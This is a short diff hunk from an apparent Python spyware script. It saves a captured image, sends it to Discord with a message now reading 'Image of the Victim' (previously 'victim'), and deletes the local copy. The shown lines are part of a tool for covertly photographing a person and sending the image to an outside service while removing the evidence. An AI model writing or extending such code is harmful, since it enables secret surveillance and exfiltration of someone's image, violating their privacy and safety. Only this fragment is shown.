@@ -33,7 +33,7 @@ def main():
     image_path = 'captured_image.jpg'
     cv2.imwrite(image_path, image)
 
-    message = "victim"
+    message = "Image of the Victim"
     send_to_discord(image_path, message)
 
     os.remove(image_path)
